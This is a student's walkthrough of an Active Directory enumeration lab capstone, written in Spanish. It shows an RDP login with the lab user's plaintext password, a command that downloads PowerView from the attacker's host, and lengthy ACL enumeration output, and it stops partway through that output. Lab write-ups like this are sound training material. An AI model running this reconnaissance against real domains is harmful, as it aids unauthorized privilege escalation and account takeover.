# Walk: Active Directory Enumeration - Capstone - VM Group 2 

## Fecha: 01/07/2025
## Host: Windows 
## IP: 192.168.xxx.70-76
## Objetivo
Capstone Exercise: Start VM Group 2 and log in as stephanie to CLIENT75. 
From CLIENT75, enumerate the object permissions for the domain users. 
Once weak permissions have been identified, use them to take full control over the account and use it to log in to the domain. 
Once logged in, repeat the enumeration process using techniques shown in this Module to obtain the flag.
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Login y Enumeracion:

* Kali

```bash
┌──(root㉿kali)-[/home/kali/OffSec/22-ActiveDirectory-Enumeration/Capstone]
└─# xfreerdp /u:"stephanie" /p:'LegmanTeamBenzoin!!' /v:192.168.234.75 /dynamic-resolut
```

* powershell

```powershell
PS C:\Users\stephanie> iwr -uri http://192.168.45.213:8000/PowerView.ps1 -Outfile pv.ps1
PS C:\Users\stephanie> dir

    Directory: C:\Users\stephanie

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         9/27/2022   6:07 AM                Contacts
d-r---        10/27/2022  12:40 AM                Desktop
d-r---        10/12/2022   5:09 AM                Documents
d-r---         10/3/2022   9:57 AM                Downloads
d-r---         9/27/2022   6:07 AM                Favorites
d-r---         9/27/2022   6:07 AM                Links
d-r---         9/27/2022   6:07 AM                Music
d-r---         9/28/2022   8:03 AM                OneDrive
d-r---         9/27/2022   6:07 AM                Pictures
d-r---         9/27/2022   6:07 AM                Saved Games
d-r---         9/27/2022   8:02 AM                Searches
d-r---         9/27/2022   6:25 AM                Videos
-a----          7/1/2025   6:13 AM         770279 pv.ps1


PS C:\Users\stephanie> . .\pv.ps1
PS C:\Users\stephanie> Get-ObjectAcl -SamAccountName stephanie -ResolveGUIDs


AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Account-Restrictions
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Logon
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Membership
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : RAS-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : X509-Cert
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-517
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Token-Groups-Global-And-Universal
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-560
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Terminal-Server
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-561
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Terminal-Server-License-Server
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-561
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Change-Password
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-1-0
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Change-Password
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : Send-As
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : Receive-As
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : General-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-11
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Public-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-11
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Personal-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-11
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Web-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-11
AccessMask             : 16
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Personal-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Email-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : Web-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1987370270-658905905-1781884369-512
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 24
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-32-548
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : ReadControl
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-11
AccessMask            : 131072
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericRead
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-10
AccessMask            : 131220
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-18
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Account-Restrictions
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Account-Restrictions
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Logon
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : User-Logon
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Membership
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Membership
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : General-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : General-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : RAS-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : RAS-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 60
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : ms-DS-Key-Credential-Link
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-526
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : ms-DS-Key-Credential-Link
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-527
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : Self
ObjectAceType          : DS-Validated-Write-Computer
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-3-0
AccessMask             : 8
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : Self
ObjectAceType          : DS-Validated-Write-Computer
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-10
AccessMask             : 8
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Token-Groups
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-9
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Token-Groups
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-9
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Group
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty
ObjectAceType          : Token-Groups
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-9
AccessMask             : 16
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : ms-TPM-Tpm-Information-For-Computer
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-10
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : GenericRead
ObjectAceType          : All
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 131220
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : GenericRead
ObjectAceType          : All
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 131220
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Group
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : GenericRead
ObjectAceType          : All
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-554
AccessMask             : 131220
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty
ObjectAceType          : ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit, ObjectInherit
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 48
AuditFlags             : None
IsInherited            : True
AceFlags               : ObjectInherit, ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=stephanie,CN=Users,DC=corp,DC=com
ActiveDirectoryRights  : ReadProperty, WriteProperty, ExtendedRight
ObjectAceType          : Private-Information
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
InheritanceFlags       : ContainerInherit
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-10
AccessMask             : 304
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0

AceType               : AccessAllowed
